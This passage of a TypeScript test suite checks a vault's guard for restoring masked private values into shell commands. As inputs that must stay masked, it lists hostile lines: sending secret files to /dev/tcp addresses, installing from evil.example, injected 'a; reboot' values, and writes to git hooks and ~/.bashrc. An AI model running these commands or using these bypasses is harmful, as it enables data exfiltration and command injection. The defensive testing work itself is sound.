    (p: string) => `cat <<'EOF' > requirements.txt\n${p}\nEOF`,
  ])(
    'round 9: a command past the read window, or writing a file that is not a document: %s',
    (build) => {
      const { np, vault, sessionId } = harness();
      const email = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
    },
  );

  it.each([(p: string) => `grep x ${p} > out.md`, (p: string) => `grep x ${p} 2>/dev/null`])(
    'a write to a document or to /dev/null still gets values back: %#',
    (build) => {
      const { np, vault, sessionId } = harness();
      const email = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restoreShellCommand(np, build(email), sessionId).command).toBe(build(EMAIL));
    },
  );

  it.each([
    (p: string) => `echo ${p} \\>|./send.md host`,
    (p: string) => `cat <<'EOF' \\>|./send.md host\n${p}\nEOF`,
    (p: string) => `cd ${p}`,
    (p: string) => `cd ${p} && ls`,
    (p: string) => `find ${p} -rm`,
    (p: string) => `cat <<'EOF' > .notes.md\n${p}\nEOF`,
    (p: string) => `cat <<'EOF' > docs/.x/notes.md\n${p}\nEOF`,
  ])('round 10: an escaped `>` before a pipe, `cd`, bfs `-rm`, hidden documents: %s', (build) => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, build(email), sessionId).keptMasked).toEqual([email]);
  });

  it('a commit message with many names gets every value back', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const lines = (v: string) =>
      Array.from({ length: 30 }, (_, i) => `Reviewed-by ${i} <${v}>`).join('\n');
    const command = (v: string) => commitStdin(`fix\n\n${lines(v)}`);

    expect(restoreShellCommand(np, command(email), sessionId).command).toBe(command(EMAIL));
  });

  it('argv never restores into position 0', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellArgv(np, [email, 'x'], sessionId).keptMasked).toEqual([email]);
  });

  it('a command whose nesting would be read past the budget keeps every value', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const unit = `${'$('.repeat(60)}ls ${email}${')'.repeat(60)} `;

    const r = restoreShellCommand(np, unit.repeat(40), sessionId);
    expect(restored(r)).toBe(0);
  });

  it('`>|` to a document file is a redirection, not a pipe', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = (n: string) => `cat <<'EOF' >| notes.md\n${n}\nEOF`;

    expect(restoreShellCommand(np, command(person), sessionId).command).toBe(command(FULL_NAME));
  });

  it('a data heredoc to a document file still gets values back', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = (n: string) => `cat > ./docs/notes.md <<'EOF'\nOwner: ${n}\nEOF`;

    expect(restoreShellCommand(np, command(person), sessionId).command).toBe(command(FULL_NAME));
  });

  it('base64 is a listed name, not a versioned "base"', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, `base64 ${email}`, sessionId).command).toBe(`base64 ${EMAIL}`);
  });

  it('reading a file under /etc does not count as writing one', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, `grep ${email} /etc/hosts`, sessionId).command).toBe(
      `grep ${EMAIL} /etc/hosts`,
    );
  });

  it('a file named after sed is not sed', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restoreShellCommand(np, `cat sed.txt ${email}`, sessionId).command).toBe(
      `cat sed.txt ${EMAIL}`,
    );
  });

  it('a heredoc delimiter must be a whole word', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    // `EOF.txt` is the delimiter here, so the `EOF` line does not end it.
    const command = `cat > a.txt <<EOF.txt\n${person}\nEOF\nrm -rf x\nEOF.txt`;

    expect(restoreShellCommand(np, command, sessionId).keptMasked).toEqual([person]);
  });

  it('a command left with an open quote or substitution loses the heredoc exception', () => {
    const { np, vault, sessionId } = harness();
    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `cat > a.txt <<'EOF'\n${person}\nEOF\necho "unterminated`;

    expect(restoreShellCommand(np, command, sessionId).keptMasked).toEqual([person]);
  });

  it('a command over the length budget keeps every placeholder', () => {
    const { np, vault, sessionId } = harness();
    const email = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `echo ${email} ${'x'.repeat(MAX_COMMAND_CHARS)}`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it.each([
    ['many heredoc operators on one line', (n: number) => 'cat <<A '.repeat(n)],
    ['nested substitutions', (n: number) => `${'echo $('.repeat(n)}x${')'.repeat(n)}`],
    ['many short commands', (n: number) => 'a;'.repeat(n * 4)],
  ])('reads %s in linear time', (_what, build) => {
    const { np, sessionId } = harness();
    const time = (n: number) => {
      const command = build(n);
      const started = performance.now();
      restoreShellCommand(np, command, sessionId);
      return performance.now() - started;
    };
    time(1000);
    const small = Math.max(time(4000), 1);
    const large = time(16000);
    // Four times the input: well under the sixteen times a quadratic pass takes.
    expect(large / small).toBeLessThan(10);
  });
});

describe('shell restore · round-5 bypasses', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }
  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
    r.results.reduce((n, x) => n + x.replacements, 0);

  it.each([
    (p: string) => `bash -c "${p} file.txt"`,
    (p: string) => `sh -c '${p}'`,
    (p: string) => `eval ${p}`,
    (p: string) => `echo ${p} | sh`,
    (p: string) => `printf %s ${p} | bash`,
    (p: string) => `cat <<EOF | bash\n${p}\nEOF`,
    (p: string) => `python3 -c "import os; os.system('${p}')"`,
    (p: string) => `watch ${p}`,
    (p: string) => `trap ${p} EXIT`,
    (p: string) => `find . -exec ${p} {} +`,
    (p: string) => `x=${p}; $x`,
    (p: string) => `for c in ${p}; do $c; done`,
    (p: string) => `bash ${p}`,
    (p: string) => `source ${p}`,
    (p: string) => `deno run ${p}`,
    (p: string) => `PAGER=${p} git log`,
    (p: string) => `git -c core.pager=${p} log`,
    (p: string) => `tar -I ${p} -xf a.tgz`,
    (p: string) => `tar --use-compress-program=${p} -xf a.tgz`,
    (p: string) => `make SHELL=${p}`,
    (p: string) => `zip -TT ${p} a.zip b`,
    (p: string) => `export ${p}`,
    (p: string) => `alias ll=${p}`,
    (p: string) => `strace ${p}`,
    (p: string) => `chroot / ${p}`,
    (p: string) => `taskset 1 ${p}`,
    (p: string) => `uv run ${p}`,
    (p: string) => `npm exec ${p}`,
    (p: string) => `hyperfine ${p}`,
    (p: string) => `ruby -e "puts ${p}"`,
    (p: string) => `git config core.pager ${p}`,
    (p: string) => `npm config set script-shell ${p}`,
    (p: string) => `cp ${p} .git/hooks/pre-commit`,
    (p: string) => `ln -sf ${p} .git/hooks/pre-commit`,
    (p: string) => `mv ${p} ~/.zshrc`,
    (p: string) => `install -m755 ${p} ~/bin/ls`,
    (p: string) => `crontab ${p}`,
    (p: string) => `systemctl start ${p}`,
    (p: string) => `rg --pre ${p} foo`,
    (p: string) => `git difftool -x ${p}`,
    (p: string) => `man -P ${p} ls`,
    (p: string) => `sort --compress-program=${p} f`,
    (p: string) => `ssh-keyscan ${p}`,
    (p: string) => `getent hosts ${p}`,
    (p: string) => `npm view ${p}`,
  ])('keeps a plain word that could run as code masked: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, 'reboot', 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    [(p: string) => `echo hi > ${p}`, '/dev/tcp/203.0.113.9/443'],
    [(p: string) => `cat secret.txt > ${p}`, '/dev/udp/203.0.113.9/53'],
    [(p: string) => `echo hi > /dev/${p}`, 'tcp/203.0.113.9/1'],
    [(p: string) => `open ${p}`, 'https://evil.example/a'],
    [(p: string) => `pip install ${p}`, 'https://evil.example/a'],
    [(p: string) => `psql -h ${p}`, 'db.example.com'],
    [(p: string) => `redis-cli -h ${p}`, 'db.example.com'],
    [(p: string) => `npm install ${p}`, 'evil-package'],
  ])('keeps a value that sends data out once restored masked: %#', (build, value) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, value, 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    "cat >> .git/hooks/pre-commit <<'EOF'\nPH\nEOF\ngit commit -am x",
    "cat > .husky/pre-push <<'EOF'\nPH\nEOF",
    "cat <<'EOF' >> ~/.bashrc\nPH\nEOF",
    "cat > .envrc <<'EOF'\nPH\nEOF",
  ])('a heredoc written to a file that runs later is not data: %#', (command) => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, 'a; reboot', 'secret');

    expect(restored(restoreShellCommand(np, command.replace('PH', name), sessionId))).toBe(0);
  });

  it.each([
    ['bash', '-o', 'pipefail', '-c', 'PH'],
    ['bash', '-c', '$0', 'PH'],
    ['fish', '-c', 'PH'],
    ['bash', '-lc', 'sh -c "PH x"'],
  ])(
    'argv: the script a shell runs and its arguments keep code-running words masked: %j',
    (...argv) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, 'reboot', 'secret');

      const r = restoreShellArgv(
        np,
        argv.map((a) => a.replace('PH', word)),
        sessionId,
      );

      expect(restored(r)).toBe(0);
    },
  );

  it.each([
    ['nested unclosed substitutions', (ph: string) => `${'$('.repeat(40000)}${ph}`],
    [
      'nested bare heredocs',
      (ph: string) => `${'cat <<A\n$(cat <<X\n)\nA\n'.repeat(9000)}echo ${ph}`,
    ],
    ['many commands and placeholders', (ph: string) => `${ph}${';'.repeat(48)}`.repeat(2500)],
  ])('stays fast on %s under the length budget', (_what, build) => {
    const { np, vault, sessionId } = harness();
    const ph = bake(vault, sessionId, EMAIL, 'private_email');
    const command = build(ph);
    expect(command.length).toBeLessThanOrEqual(MAX_COMMAND_CHARS);

    const started = performance.now();
    restoreShellCommand(np, command, sessionId);
    expect(performance.now() - started).toBeLessThan(MAX_LONG_COMMAND_MS);
  });
});

describe('shell restore · round-10 layout and redirections', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }
  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
    r.results.reduce((n, x) => n + x.replacements, 0);

  it.each([
    ["cat > notes.md <<'EOF'\nA\nB\nmore text\nEOF", 'EOF'],
    ["cat <<'EOF'\nA\nB\nEOF", 'EOF'],
    [`git commit -m "$(cat <<'EOF'\nA\nB\nEOF\n)"`, 'EOF'],
    ['cat > notes.md <<EOF\nA\nB\nEOF', 'EOF'],
    // After `E` on its line, `OF` completes the delimiter.
    ["cat <<'EOF'\nEA\nB\nEOF", 'OF'],
    // With `<<-`, leading tabs are stripped before the line is compared.
    ["cat <<-'EOF'\nA\nB\n\tEOF", '\tEOF'],
  ])('keeps every value when one ends its heredoc early: %#', (command, delimiter) => {
    const { np, vault, sessionId } = harness();
    const end = bake(vault, sessionId, delimiter, 'secret');
    const next = bake(vault, sessionId, 'a; reboot', 'secret');
    const masked = command.replace('A', end).replace('B', next);

    const r = restoreShellCommand(np, masked, sessionId);

    expect(restored(r)).toBe(0);
    expect(r.command).toBe(masked);
  });

  it('still restores a heredoc body whose values do not end it', () => {
    const { np, vault, sessionId } = harness();
    const end = bake(vault, sessionId, 'EOF is the delimiter', 'secret');
    const command = `cat > notes.md <<'EOF'\n${end}\nEOF`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(1);
  });

  it.each([
    (p: string) => `cat <<'END-MSG'\nx\nEND-MSG\nls ${p}`,
    (p: string) => `cat <<"E"OF\nx\nEOF\nls ${p}`,
    (p: string) => `echo "$(cat <<'EOF'\nmsg\nEOF)" && ls ${p}`,
  ])('keeps every value after a heredoc whose closing line is not found: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `echo x \\<& rm -f ${p}`,
    (p: string) => `ls \\<& gh gist create ${p}`,
    (p: string) => `echo x \\>& rm -f ${p}`,
    (p: string) => `echo x \\>& notes.md ${p}`,
  ])('an escaped `<` or `>` before `&` does not hide the next command: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `git log --format='%an <%ae>' --author=${p}`,
    (p: string) => `git commit -m "rename a -> b for ${p}"`,
    (p: string) => `grep -E "a>b" ${p}`,
    (p: string) => `echo ${p} > 'notes.md'`,
    (p: string) => `ls ${p} > /dev/stderr 2>&1`,
    (p: string) => `ls ${p} >&2`,
    (p: string) => `echo ${p} >> docs/Notes.MD`,
  ])('a `>` that writes no file, or writes a document, keeps values: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(1);
  });

  it.each([
    'cmakelists.txt',
    'Requirements.txt',
    'requirements/base.txt',
    'dev-requirements.txt',
    'test_doc.txt',
    'out.json',
  ])('a heredoc written to a build or test input keeps its values: %s', (file) => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `cat > ${file} <<'EOF'\n${name}\nEOF`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it('does not count a commit message heredoc toward the read window', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const long = `${'word '.repeat(1200)}\n${'more '.repeat(80)}`;

    expect(restored(restoreShellCommand(np, commitStdin(`${long}${name}`), sessionId))).toBe(1);
  });

  it.each([
    (p: string) => `: &>/dev/null ${p}`,
    (p: string) => `cat notes.md &>> out.log ${p}`,
    (p: string) => `grep ${p} notes.md &>/dev/null`,
  ])('keeps every value with `&>`, which dash and ksh read as `&` then `>`: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each(['\r', '\u0000', '\u000b', '\u2028'])(
    'keeps every value in a command holding control character %j',
    (control) => {
      const { np, vault, sessionId } = harness();
      const name = bake(vault, sessionId, FULL_NAME, 'private_person');
      const command = `cat > notes.md <<'EOF'${control}\n${name}\nEOF`;

      expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
    },
  );

  it.each([
    [(p: string) => `GIT_PAGER=cat git log --author=${p}`, 0],
    [(p: string) => `GREP ${p} notes.md`, 0],
    [(p: string) => `grep3 ${p} notes.md`, 0],
    [(p: string) => `ls.exe ${p}`, 0],
    [(p: string) => `echo ${p} >! notes.md`, 0],
    [(p: string) => `grep ${p} notes.md <<'EOF'`, 0],
    [(p: string) => `LC_ALL=C grep ${p} notes.md`, 1],
  ])('reads a listed program only as written and alone: %#', (build, expected) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
  });

  it('holds a value glued to a redirection, which digits would turn into a descriptor', () => {
    const { np, vault, sessionId } = harness();
    const digits = bake(vault, sessionId, '2', 'secret');

    expect(restored(restoreShellCommand(np, `echo ${digits}>notes.md`, sessionId))).toBe(0);
  });

  it('argv: a URL handed to a program that is not a data one keeps every value', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['grep', 'https://example.org/x', word], sessionId);

    expect(restored(r)).toBe(0);
  });

  it('restores into a heredoc body however many commands come before it', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `${'ls;'.repeat(100)}\ncat > notes.md <<'EOF'\n${name}\nEOF`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(1);
  });

  it('argv: `cd` gets no value, as in shell code', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellArgv(np, ['cd', word], sessionId))).toBe(0);
  });

  it.each([
    [(p: string) => `git grep -n3O${p} probe`, 0],
    [(p: string) => `git grep -${'n'.repeat(300)}O${p} probe`, 0],
    [(p: string) => `file -0C -m ${p}`, 0],
    [(p: string) => `sort -${'r'.repeat(300)}o out.sh ${p}`, 0],
    [(p: string) => `base64 -${'D'.repeat(300)}o out.sh ${p}`, 0],
    [(p: string) => `git grep -n ${p}`, 1],
    [(p: string) => `sort -t, -k2 ${p}`, 1],
  ])(
    'finds an option that runs or writes anywhere in a short-option cluster: %#',
    (build, expected) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
    },
  );

  it.each([
    [(p: string) => `PATH=/tmp/x; grep ${p} notes.md`, 0],
    [(p: string) => `PATH=/tmp/x && grep ${p} notes.md`, 0],
    [(p: string) => `HOME=/tmp/x; git log --author=${p}`, 0],
    [(p: string) => `GIT_EDITOR=true; git commit --author=${p}`, 0],
    [(p: string) => `LANG=C; grep ${p} notes.md`, 1],
  ])(
    'reads an assignment as a command of its own like one before a program: %#',
    (build, expected) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
    },
  );

  it.each([
    (p: string) => `LANG=C for grep ${p}`,
    (p: string) => `>/dev/null done x ${p}`,
    (p: string) => `TZ=UTC then cat ${p}`,
  ])('does not read a reserved word where the program stands: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    [(p: string) => `echo ${p} >>&2`, 0],
    [(p: string) => `grep ${p} notes.md 2>>&1`, 0],
    [(p: string) => `grep ${p} notes.md >>&-`, 0],
    [(p: string) => `grep ${p} notes.md 2>&1`, 1],
    [(p: string) => `grep ${p} notes.md >> notes.md`, 1],
  ])(
    "does not read zsh's `>>&`, which appends to a file named by its digits: %#",
    (build, expected) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
    },
  );

  it('keeps only the value holding a control character in a data heredoc body', () => {
    const { np, vault, sessionId } = harness();
    const control = bake(vault, sessionId, 'a\u001bb', 'secret');
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `cat > notes.md <<'EOF'\n${control}\n${name}\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(restored(r)).toBe(1);
    expect(r.command).toContain(control);
    expect(r.command).toContain(FULL_NAME);
  });

  it.each(['\u0080', '\u0090', '\u009b', '\u009f'])(
    'keeps every value in a command holding C1 control character %j',
    (control) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restored(restoreShellCommand(np, `grep ${word} notes.md${control}`, sessionId))).toBe(
        0,
      );
    },
  );

  it.each([
    [(p: string) => `grep a<${p}`, 0],
    [(p: string) => `grep a< ${p}`, 0],
    [(p: string) => `grep a<"${p}"`, 0],
    [(p: string) => `grep a 2<${p}`, 0],
    [(p: string) => `grep a ${p}`, 1],
    [(p: string) => `grep "a<b" ${p}`, 1],
    [(p: string) => `echo hi>notes.md && grep ${p} notes.md`, 1],
  ])('holds an input redirection target glued to the word before it: %#', (build, expected) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
  });

  it.each([
    [(p: string) => `cat <'${p} x'`, 0],
    [(p: string) => `cat 0<"${p} x"`, 0],
    [(p: string) => `grep probe a<'${p} x'`, 0],
    [(p: string) => `grep probe <${p}' x'`, 0],
    [(p: string) => `grep probe ${p}2>/dev/null`, 0],
    [(p: string) => `grep probe ${p}10<notes.md`, 0],
    [(p: string) => `grep probe ${p} 2>/dev/null`, 1],
  ])(
    'holds a redirection target with a quoted blank, and a value before digits and a redirection: %#',
    (build, expected) => {
      const { np, vault, sessionId } = harness();
      const digits = bake(vault, sessionId, '1', 'secret');

      expect(restored(restoreShellCommand(np, build(digits), sessionId))).toBe(expected);
    },
  );

  it.each([
    [(p: string) => `printf '%d\\n' ${p}; grep probe notes.md`, 'probe=7', 0],
    [(p: string) => `printf '%*s' ${p} x`, 'probe=7', 0],
    [(p: string) => `printf ${p}`, EMAIL, 0],
    [(p: string) => `[ 1 -lt ${p} ] && grep probe notes.md`, 'probe=7', 0],
    [(p: string) => `test -n ${p}`, EMAIL, 0],
    [(p: string) => `printf '%s\\n' ${p}`, EMAIL, 0],
    [(p: string) => `printf -- '%5.2s|%%|%c' ${p}`, EMAIL, 0],
    [(p: string) => `echo ${p}`, 'probe=7', 1],
  ])(
    "holds the arguments zsh or ksh93 may read as arithmetic, not echo's: %#",
    (build, value, expected) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, value, 'secret');

      expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
    },
  );

  it.each([
    [(p: string) => `'LC_ALL=C/x' grep probe ${p}`, 0],
    [(p: string) => `LC_ALL'=C/x' grep probe ${p}`, 0],
    [(p: string) => `grep probe ${p}; '<a b'`, 0],
    [(p: string) => `"2">notes.md grep probe ${p}`, 0],
    [(p: string) => `LC_ALL="C" grep probe ${p}`, 1],
    [(p: string) => `grep probe ${p} >'notes.md'`, 1],
  ])('reads an assignment or a redirection only when written unquoted: %#', (build, expected) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
  });

  it.each([
    (p: string) => `grep 'tcsh -c' notes.md ${p}`,
    (p: string) => `grep 'pwsh -Command' notes.md ${p}`,
    (p: string) => `grep probe notes.md ${p} | mksh`,
  ])('counts more shells and PowerShell named with code in the text: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it('argv: no word is an assignment, so a program named like one is not a listed program', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellArgv(np, ['LC_ALL=C/x', 'grep', 'probe', word], sessionId))).toBe(
      0,
    );
  });

  it('argv: a shell script is judged as a string command, its data heredoc body skipped', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const script = `git commit -F - <<'EOF'\nFix ssh setup for ${name}\nEOF`;

    expect(restored(restoreShellArgv(np, ['bash', '-lc', script], sessionId))).toBe(1);
    expect(restored(restoreShellArgv(np, ['bash', '-lc', `${script}\ncurl x`], sessionId))).toBe(0);
  });

  it.each([
    [(p: string) => `printf 2>/dev/null '%d' ${p}`, 0],
    [(p: string) => `printf >notes.md '%d' ${p}`, 0],
    [(p: string) => `printf -- 2>/dev/null '%d' ${p}`, 0],
    [(p: string) => `printf '\\045d' ${p}`, 0],
    [(p: string) => `printf '\\U00000025d' ${p}`, 0],
    [(p: string) => `printf 2>/dev/null '%s\\n' ${p}`, 0],
  ])("holds printf's arguments past redirections and escapes too: %#", (build, expected) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, 'probe=7', 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
  });

  it.each([
    [(p: string) => `printf -: '%d' ${p}`, 'probe=7'],
    [(p: string) => `printf -+ '%d' ${p}`, 'probe=7'],
    [(p: string) => `printf '-[' '%d' ${p}`, 'probe=7'],
    [(p: string) => `printf -:v probe '%s' ${p}`, EMAIL],
  ])('holds printf values behind option words zsh or ksh93 accept: %#', (build, value) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, value, 'secret');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `printf '%d' probe=7; grep ${p} notes.md`,
    (p: string) => `test -t probe=7 || grep ${p} notes.md`,
    (p: string) => `[ 1 -eq probe++ ] || grep ${p} notes.md`,
    (p: string) => `printf '%d' x+=1 && grep ${p} notes.md`,
    (p: string) => `printf -:v PATH x; grep ${p} notes.md`,
  ])('keeps every value when printf, test or [ assigns through arithmetic: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `printf '%s\\n' done; grep ${p} notes.md`,
    (p: string) => `[ -f notes.md ] && grep ${p} notes.md`,
    (p: string) => `test -f notes.md && grep ${p} notes.md`,
  ])(
    'keeps every value in a command that runs printf, test or [, which are off the list: %#',
    (build) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
    },
  );

  it.each([
    [(p: string) => `LC_ALL=C.UTF-8 grep ${p} notes.md`, 1],
    [(p: string) => `LANGUAGE=en_US:en grep ${p} notes.md`, 1],
    [(p: string) => `TZ=Europe/Rome git log --author=${p}`, 1],
    [(p: string) => `LANG=de_DE.UTF-8@euro; grep ${p} notes.md`, 1],
    [(p: string) => `LC_ALL=en_US.UTF-8 grep ${p} notes.md`, 1],
    [(p: string) => `LANG=POSIX grep ${p} notes.md`, 1],
    [(p: string) => `LANG=de_DE@euro; grep ${p} notes.md`, 0],
    [(p: string) => `LC_ALL=zh_TW.Big5 grep ${p} notes.md`, 0],
    [(p: string) => `LC_ALL=zh_CN.GBK; grep ${p} notes.md`, 0],
    [(p: string) => `TZ=/tmp/zone git log --author=${p}`, 0],
    [(p: string) => `TZ=../zone git log --author=${p}`, 0],
    [(p: string) => `LC_ALL=/tmp/locale grep ${p} notes.md`, 0],
    [(p: string) => `LC_ALL=a=b grep ${p} notes.md`, 0],
    [(p: string) => `LANGUAGE=.. git log --author=${p}`, 0],
    [(p: string) => `LC_ALL=.. grep ${p} notes.md`, 0],
    [(p: string) => `LANGUAGE=en:.. diff a.md ${p}`, 0],
    [(p: string) => `LANG=.; grep ${p} notes.md`, 0],
    [(p: string) => `TZ=Etc/GMT+1 git log --author=${p}`, 1],
    [(p: string) => `LANG= grep ${p} notes.md`, 1],
  ])('allows the locale and time zone only with a plain name: %#', (build, expected) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
  });

  it.each([
    ['printf', '%s'],
    ['test', '-n'],
    ['[', '-n'],
  ])('argv: holds the arguments of %s as in shell code', (program, option) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellArgv(np, [program, option, word], sessionId))).toBe(0);
  });

  it.each([
    (p: string) => `stat -A probe notes.md; grep ${p} notes.md`,
    (p: string) => `stat -nH probe notes.md; grep ${p} notes.md`,
    (p: string) => `realpath -a probe notes.md; grep ${p} notes.md`,
    (p: string) => `cut -a probe -f1 notes.md; grep ${p} notes.md`,
  ])(
    'keeps every value with the options a loadable builtin sets a variable through: %#',
    (build) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');

      expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
    },
  );

  it.each([
    (p: string) => `echo ${p} > bin/notes.md`,
    (p: string) => `echo ${p} > venv/bin/notes.md`,
    (p: string) => `echo ${p} > /opt/homebrew/bin/notes.md`,
    (p: string) => `echo ${p} > sbin/notes.md`,
  ])('keeps every value in a command that writes into any bin directory: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
  });

  it.each([
    [(p: string) => `cd requirements && echo ${p} > base.txt`, 0],
    [(p: string) => `cd .git && echo ${p} > notes.md`, 0],
    [(p: string) => `echo ${p} > BIN/notes.md`, 0],
    [(p: string) => `echo ${p} > /ETC/notes.md`, 0],
    [(p: string) => `cd docs && grep ${p} notes.md`, 1],
    [(p: string) => `cd docs && grep ${p} notes.md > /tmp/hits.md`, 1],
    [(p: string) => `echo ${p} > /private/etc/notes.md`, 0],
    [(p: string) => `echo ${p} > notes.txt`, 0],
    [(p: string) => `git add bin/cli.js && grep ${p} notes.md > hits.md`, 1],
  ])('judges a write after a cd, and bin directories as targets only: %#', (build, expected) => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');

    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(expected);
  });

  it('restores a commit message beside a git add of a bin path', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `git add bin/cli.js && git commit -F - <<'EOF'\nFix for ${name}\nEOF`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(1);
  });

  it.each([
    [['bash', '-c'], 1],
    [['/bin/bash', '-c'], 1],
    [['/usr/bin/sh', '-c'], 1],
    [['./bash', '-c'], 0],
